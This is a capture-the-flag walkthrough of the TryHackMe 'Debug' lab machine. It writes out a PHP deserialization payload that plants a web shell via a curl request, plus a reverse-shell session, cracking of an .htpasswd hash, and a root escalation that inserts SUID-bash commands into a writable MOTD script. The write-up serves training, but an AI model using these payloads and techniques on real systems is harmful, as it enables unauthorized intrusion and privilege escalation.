---
description: >-
  Walkthrough of the machine Debug on TryHackMe -
  https://tryhackme.com/room/debug
---

# Debug - THM Walkthrough

**IP:** 10.10.51.225

#### Enumeration <a id="enumeration"></a>

We can scan the host using [rustscan](https://github.com/RustScan/RustScan) \(like nmap; but faster!\) for open ports:

```d
rustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV
```

* `-a` specifies the Host IP address
* `--timeout` specifies the timeout before saying the port is closed
* `--tries` how many times to try and connect to the port
* `--ulimit` specifies how many sockets to open at a time
* `--` for passing arguments for nmap
* `-sC -sV` nmap arguments telling rustscan to run default scripts and version fingerprinting

Scan results:

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403130608.png)

Alright, so, we’ve found 2 open ports. 22 and 80.

```d
┌──(root💀b0x)-[~/Downloads]                                                                                                                                                                               [95/999]
└─# rustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                 
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.51.225:22
Open 10.10.51.225:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 13:04 PKT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Initiating Ping Scan at 13:04
Scanning 10.10.51.225 [4 ports]
Completed Ping Scan at 13:04, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:04
Completed Parallel DNS resolution of 1 host. at 13:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 13:04
Scanning 10.10.51.225 [2 ports]
Discovered open port 80/tcp on 10.10.51.225
Discovered open port 22/tcp on 10.10.51.225
Completed SYN Stealth Scan at 13:04, 0.25s elapsed (2 total ports)
Initiating Service scan at 13:04
Scanning 2 services on 10.10.51.225
Completed Service scan at 13:05, 6.52s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.51.225.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 6.38s elapsed                                                                    
NSE: Starting runlevel 2 (of 3) scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.82s elapsed                                                                    
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05                 
Completed NSE at 13:05, 0.00s elapsed   
Nmap scan report for 10.10.51.225       
Host is up, received reset ttl 60 (0.28s latency).
Scanned at 2021-04-03 13:04:58 PKT for 14s                                                               

PORT   STATE SERVICE REASON         VERSION                                                              
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:      
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX
81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs=
|   256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:        
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                    
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:05      
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.00s elapsed                                                                    
NSE: Starting runlevel 3 (of 3) scan.                                                                    
Initiating NSE at 13:05             
Completed NSE at 13:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds      
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)

```

#### SSH \(Port 22\) <a id="ssh-port-22"></a>

Let’s go with the waterfall mechanism and first enumerate port 22. We can try credentials bruteforcing using [BruteX](https://github.com/1N3/BruteX) and check the version for any vulnerabilities which are public and exploitable.

From googling the exact banner/version, we can see that the specific version is vulnerable to username enumeration

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132341.png)

–

Let’s try and do it using metasploit’s module.

We can search for the module using `search` with an filter of `port:22` for only searching for everything written for SSH/Port22 with enum

```text
search port:22 ssh_enum
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132441.png)

–

Let’s run it.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132511.png)

–

We can see that it enumerated the user root and can probably guess the password will be something really long. Let’s goto port 80 for now and we’ll come back to SSH if we need something.

#### HTTP \(Port 80\) <a id="http-port-80"></a>

Let’s browse the application to get an idea in which programming language it was written, what’s it’s using as it’s backend server, etc.

```http
http://10.10.51.225/
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132639.png)

So, we get met with Apache2’s default installation page. Let’s try and see if `/robots.txt` has something in it.

```http
http://10.10.51.225/robots.txt
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403132759.png)

Sadly, it doesn’t exist either.

–

We can now utilize [gobuster](https://github.com/OJ/gobuster) or [dirsearch](https://github.com/maurosoria/dirsearch) to enumerate the hidden directories hosted on the web application.

I’ll use `dirsearch` to save some time downloading and setting up `gobuster`.

```d
python3 dirsearch.py -u http://10.10.51.225 -e all -t 100
```

```d
┌──(root💀b0x)-[~/tools/dirsearch]
└─# python3 dirsearch.py -u http://10.10.51.225 -e all -t 100                                                                                                                                                  1 ⨯
/mnt/hgfs/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: all | HTTP method: GET | Threads: 100 | Wordlist size: 8948

Error Log: /mnt/hgfs/tools/dirsearch/logs/errors-21-04-03_13-30-02.log

Target: http://10.10.51.225/

Output File: /mnt/hgfs/tools/dirsearch/reports/10.10.51.225/_21-04-03_13-30-03.txt

[13:30:03] Starting: 
[13:30:16] 403 -  277B  - /.ht_wsr.txt
[13:30:17] 403 -  277B  - /.htaccessOLD
[13:30:17] 403 -  277B  - /.htaccess_orig
[13:30:17] 403 -  277B  - /.htaccess_sc
[13:30:17] 403 -  277B  - /.htaccessBAK
[13:30:17] 403 -  277B  - /.htaccess_extra
[13:30:17] 403 -  277B  - /.htaccessOLD2
[13:30:17] 403 -  277B  - /.htm
[13:30:17] 403 -  277B  - /.htpasswd_test
[13:30:17] 403 -  277B  - /.html
[13:30:17] 403 -  277B  - /.httr-oauth
[13:30:17] 403 -  277B  - /.htpasswds
[13:30:18] 403 -  277B  - /.htaccess.sample
[13:30:19] 403 -  277B  - /.htaccess.save
[13:30:19] 403 -  277B  - /.htaccess.bak1
[13:30:19] 403 -  277B  - /.htaccess.orig
[13:30:20] 403 -  277B  - /.php3
[13:30:21] 403 -  277B  - /.php
[13:30:35] 301 -  313B  - /backup  ->  http://10.10.51.225/backup/
[13:30:36] 200 -    2KB - /backup/
[13:30:45] 200 -   11KB - /index.html
[13:30:46] 301 -  317B  - /javascript  ->  http://10.10.51.225/javascript/
[13:30:46] 200 -    6KB - /index.php
[13:30:46] 200 -    6KB - /index.php/login/
[13:31:02] 200 -    2KB - /readme.md
[13:31:03] 403 -  277B  - /server-status/
[13:31:03] 403 -  277B  - /server-status

Task Completed

```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403133131.png)

–

Alright, we can see `/backup/` directory and `/readme.md` which also seems kinda interesting. Let’s visit these and see what’s hosted in them.

```http
http://10.10.51.225/readme.md
```

Let’s cURL it.

```d
$~ curl -i http://10.10.51.225/readme.md

# Welcome to Base                 
A super simple, responsive framework built to work on mobile devices, tablets, netbooks and desktop computers.

## Reasons to use base for your next web project
### Responsive Design
Built for all devices big and small, base has got you covered.

### Foundation Styles
Custom styles for headings, tables, blockquotes forms and much more.

### Accessibility in mind
Works with screen readers in mind and has JS fallbacks.

### Easy to learn
Well commented CSS to ensure your implementation is a breeze.

### Cross-Browser
Covers IE7+ and modern browsers such as Chrome, Firefox and Opera.

### Base is Awesome!
Preview the [demo page](http://matthewhartman.github.com/base/demo/) to see the Base Framework in all its glory! :)


## Repo Contents
1. readme.md - Feel free to delete this! ;)
2. index.html - An example page with Base in action
3. style.css - Base stylesheet including styles for headings, tables, body content, etc
4. default.js - Base javascript file to get you started

Base was built by Matthew Hartman (@hartmanmatthew), a passionate front end developer based in Melbourne, Australia.

## Thank You / Credits
- Mark Otto (@mdo) & Jacob Thornton (@fat) for some base styles taken from BootStrap
- Nicolas Gallagher (@necolas) for the Micro ClearFix :)

```

We can see that it returns README.md source of some repository, maybe we can explore it later?

For now, let’s move to the `/backup/` folder

```http
http://10.10.51.225/backup/
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403133609.png)

The `/backup/` directory contains interesting .bak files, let’s `cURL` those one by one and see their source code.

```d
┌──(root💀b0x)-[~/tools/dirsearch]
└─# curl -i http://10.10.51.225/backup/index.html.bak                                                    
HTTP/1.1 200 OK                                                                                          
Date: Sat, 03 Apr 2021 08:36:44 GMT                                                                      
Server: Apache/2.4.18 (Ubuntu)                                                                           
Last-Modified: Wed, 10 Mar 2021 01:10:05 GMT                                                             
ETag: "2c39-5bd2453bf4a05"                                                                               
Accept-Ranges: bytes                                                                                     
Content-Length: 11321                                                                                    
Content-Type: application/x-trash                                                                        
                                                    
                                                    
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">                                                                                          
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }

  div.main_page {

```

We can see that the page also points to default Apache installation page. Let’s try `.php.bak` file now.

I’ll be downloading and analysing it in Sublime text \(text editor\).

```d
┌──(root💀b0x)-[~/tools/dirsearch]
└─# curl http://10.10.51.225/backup/index.php.bak -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6399  100  6399    0     0  10438      0 --:--:-- --:--:-- --:--:-- 10438
                                                                                                                     
┌──(root💀b0x)-[~/tools/dirsearch]
└─# 
                                                                                                    
┌──(root💀b0x)-[~/tools/dirsearch]
└─# head index.php.bak    
<!doctype html>
<html lang="en" class="no-js">
<head>
  <meta charset="utf-8">
  <title>Base</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
  <link rel="stylesheet" media="screen" href="style.css">
</head>
<body>

```

–

In the heading, we can see that it too points to the same framework **Base** which was discussed above in the README.md file, let’s try searching this framework.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134059.png)

So, the guy has deleted this repository \(base\) from his github account. Maybe shifted somewhere else? Let’s try searching it on google rather than using the link from `readme.md` file.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134336.png)

Seeing the `readme.md` contents again, we can probably deduce that this framework \(if used\) is only going to be used for styling. Since, it doesn’t mention anywhere in the `README.md` file that there is any PHP code in it.

–

We can continue reading the source code of the `index.php.bak` file for now.

–

We can see on line 216 – 220. We can just input a `$_GET['debug']` debug parameter with serialize input and the source code will unserialize it.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134619.png)

We know that the code is vulnerable to PHP Deserialization but how to exploi this? We only have the .bak file and this won’t execute/render as PHP on the server.

Were there any hidden directories we missed while the enumeration?

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134923.png)

Yes! we didn’t discuss `/index.php` file, let’s try accessing it.

The page looks something like this:

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134959.png)

–

#### Exploitation <a id="exploitation"></a>

Alright, now time for the exploitation. Before that, we need to learn what **PHP deserialization** is and before that, what is **serialization**?

We use **serialization** when we want a `piece of code` or some object to be stored in a **database** or when we’re expecting some _piece of code_ through an **API call** or something and then we want to execute it/load it.

If you’re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.

To not do the above^, we use **serialization**, it takes your piece of code/object, **serializes** it and stores in the **database** and while retreiving it, it **unserializes** the `piece of code` and executes it.

For the _API call_, it just receieves **serialized code** already and executes it while **unserializing** it.

_**Note: It is always recommended to never take any input either through database or through APIs or any files on the system and mostly don’t even use deserialization if not really required. If it’s required, never let the user control the parameters!**_

P.S ~ The above information about serialization is generic and not only based on PHP de\(serialization\)!

You can find more details in this [youtube video](https://www.youtube.com/watch?v=gTXMFrctYLE) created by a friend of mine; [Mukarram Khalid](https://www.linkedin.com/in/mukarramkhalid/).

So, now that we’ve a base understanding of what **serialization** is, let’s move to the _source code_ and see what we can **exploit** here.

We can see that the PHP code is using a magic function \(i.e. `__destruct()`\)

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}
```

–

**What is \_\_destruct?**

`__destruct` magic method is used to always run or do a task at the end of the execution. Let’s say we want to do something everytime \(maybe update a local log file?\), it’ll do that in the end of the execution.

What is it doing in the above application?

```php
public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}
```

* It’s creating a file in our `__DIR__` \(or `pwd`\) in the directory and with the message whatever is specified \(using the two properties being used from the class\)
* It then echo’s a string: ‘Your submission has been successfully saved’

–

Now, we can write our own code matching the above^ but just change the contents and the file name, let’s try it.

Remember, we need to use the same **class name** and **same properties names**!

```php
<?php

class FormSubmit {
	public $form_file 	= 'umar0x01.php';
	public $message 	= '<?php system($_GET[123]); ?>';
}

$newObj 	= new FormSubmit;

echo serialize($newObj);

?>
```

Let’s run add this PHP code in a local file and run it.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142007.png)

Alright, we get the serialized string:

```d
O:10:"FormSubmit":2:{s:9:"form_file";s:12:"umar0x01.php";s:7:"message";s:28:"<?php system($_GET[123]); ?>";}
```

Let me try and walk you through the whole serialized string.

* `O` means object
* `O:10` means object name’s length \(i.e. -&gt; 10\)
* `2:{` means there are two properties/attributes
* `s:9` means that our property/attribute is a string and is of length of 9 chars
* `s:9:"form_file";` Length of 9 and property name

Probably, that explained the serialized string. You can always google for more details!

Now, we need to URL encode our string and pass it into the `debug` parameter in the application.

For URL encoding, I’ll use [cyberchef](https://gchq.github.io/CyberChef).

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142403.png)

URL Encoded string looks like:

```d
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A12%3A%22umar0x01%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24%5FGET%5B123%5D%29%3B%20%3F%3E%22%3B%7D
```

Let’s pass this in the URL and see if our new file gets created.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142455.png)

Yay! It did, the string printed in the bottom indicates that.

Here’s the cURL request, if you’ve problems reproducing the above:

```bash
curl -i 'http://10.10.51.225/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}' --globoff \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Connection: close'
```

Now, let’s access the .php file with our RCE code in it and get reverse shell!

```d
view-source:http://10.10.51.225/umar0x01.php?123=ls%20-la
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142819.png)

We can generate RCE payloads to fallback if something isn’t present utilizing [reverse-shell.sh](https://reverse-shell.sh/) and call it with cURL.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403142924.png)

I’ll let you figure out what’s happening below, just remember that I wrote the above shell script generated in a file named `shell.sh` in my local directory since the machine doesn’t have access to the internet.

#### Reverse Shell: <a id="reverse-shell"></a>

Now that we’ve reverse shell, let’s try and get tty shell and make it interactive!

–

First, we’ll get the tty shell using python’s onliner:

```python
python3 -c "__import__('pty').spawn('/bin/bash')"
```

```bash
┌──(root💀b0x)-[/mnt/hgfs/THM/Debug]
└─# nc -nlvp 4444                              
listening on [any] 4444 ...
connect to [10.17.0.120] from (UNKNOWN) [10.10.51.225] 50224
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python
/usr/bin/python
$ which python3
/usr/bin/python3
$ python3 -c "__import__('pty').spawn('/bin/bash')"

www-data@osboxes:/var/www/html$ 
www-data@osboxes:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@osboxes:/var/www/html$ 

www-data@osboxes:/var/www/html$ 

```

–

Now that we’ve tty shell, let’s make it interactive \(i.e. Ctrl + C or other things don’t exit the shell!\)

_**Note:** We need bash shell to make it interactive!_

Type: ‘Ctrl + Z’ and background the process.

Now we’ll use:

```d
stty raw -echo
```

And then type `fg` to foreground the process \(get it back\)

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403143723.png)

Now that we’ve interactive shell, let’s add the _rows/cols \(generic\)_ and add some **colors UwU**!

```bash
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ' # green
alias ls='ls --color=auto'
alias grep='grep --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'
alias ll='ls -alFh'
alias la='ls -A'
alias l='ls -CF'
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403143941.png)

```d
stty rows 48
stty columns 211
export TERM=screen
```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144025.png)

–

Alright, we got the initial shell and it’s fully interactive! Time to get the initial flag and privesc our way to root!

–

We can find a `.htpasswd` \(usually used for **HTTP authentication**\) file right in `/var/www/html/` containing the following credentials:

```d
www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

Let’s run john and try to crack these.

```d
┌──(root💀b0x)-[/mnt/hgfs/THM/Debug]
└─# john htpasswd.hash                           
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 84 candidates buffered for the current salt, minimum 96 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
jamaica          (james)
1g 0:00:00:00 DONE 2/3 (2021-04-03 14:42) 20.00g/s 41760p/s 41760c/s 41760C/s bigdog..88888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144206.png)

–

We get a password: **jamaica**

Where can we use it? Let’s see `/etc/passwd` file if it contains any other users except for `www-data` and `root`

```d
www-data@osboxes:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
james:x:1001:1001::/home/james:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```

Alright, we can try the credentials against the user: `james`

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144400.png)

–

**Flag \(user.txt\)**

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403144420.png)

–

Time for privesc!

#### Privileges Escalation <a id="privileges-escalation"></a>

Before running LinEnum, LSE or LinPeas, let’s try and do some manual enumeration first!

Let’s try and get the list of binaries we can run with sudo!

```d
james@osboxes:~$ sudo -l 
[sudo] password for james: 
Sorry, user james may not run sudo on osboxes.
```

Nothing we can run with sudo! :\(

Let’s try and list the crontabs \(if any\)

```d
james@osboxes:~$ crontab -l
no crontab for james
```

Nothing there as well!

–

We can see that `.bash_history` is present in the directory, let’s check it out.

```d
james@osboxes:~$ cat .bash_history
ls
clear
exit
ls
clear
exit
ls
clear
exit
ls
cd /home/james/
ls
cat Note-To-James.txt 
ls
cd /etc/update-motd.d/
ls
ls -la
ls
clear
ls
clear
ls
clera
ls
clear
ls
clear
ls -la
cd /
ls
cd /root/
ls
exit
ls
clear
exit
nano id_rsa
chmod 600 id_rsa 
ssh -i id_rsa root@10.250.0.12
exit
```

–

We’ve a note file in the local directory:

```d
james@osboxes:~$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

–

We’ve seen `.bash_history` containing a directory `/etc/update-motd.d/`, let’s check it out!

```d
james@osboxes:~$ ls -la /etc/update-motd.d/
total 44
drwxr-xr-x   2 root root   4096 Mar 10 18:38 .
drwxr-xr-x 134 root root  12288 Mar 10 20:08 ..
-rwxrwxr-x   1 root james  1220 Mar 10 18:32 00-header
-rwxrwxr-x   1 root james     0 Mar 10 18:38 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
```

We can see that we’ve read/write/execute permissions on the files. But what can we do with these?

```bash
james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
```

Alright, seems like simple bash commands, let’s just copy `bash` to `tmp` and set root’s SUID bit on it and see if that works.

Added the instructions in 3-4 lines.

```d
james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh

cp /bin/bash /tmp/
chmod u+s /tmp/bash

#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
